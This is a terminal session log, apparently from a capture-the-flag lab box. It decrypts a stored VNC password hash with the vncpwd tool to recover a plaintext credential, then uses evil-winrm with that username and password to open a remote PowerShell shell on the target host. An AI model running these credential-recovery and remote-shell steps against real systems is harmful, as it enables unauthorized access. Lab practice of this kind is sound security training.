allenwest1@debian:~$ cd Desktop/
allenwest1@debian:~/Desktop$ sudo git clone https://github.com/jeroennijhof/vncpwd.git
[sudo] password for allenwest1: 
Cloning into 'vncpwd'...
remote: Enumerating objects: 28, done.
remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28
Unpacking objects: 100% (28/28), done.
allenwest1@debian:~/Desktop$ cd vncpwd/
allenwest1@debian:~/Desktop/vncpwd$ sudo gcc -o vncpwd vncpwd.c d
allenwest1@debian:~/Desktop/vncpwd$ sudo echo "a88qS25ayg8=" | base64 -d > passhash
allenwest1@debian:~/Desktop/vncpwd$ ./vncpwd 
Password: sT333ve2
allenwest1@debian:~$ cd Desktop/
allenwest1@debian:~/Desktop$ evil-winrm

Evil-WinRM shell v2.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -h, --help                       Display this help message

allenwest1@debian:~/Desktop$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents>  
.
.
.
// Continued is asSmith.bash
.
.
.
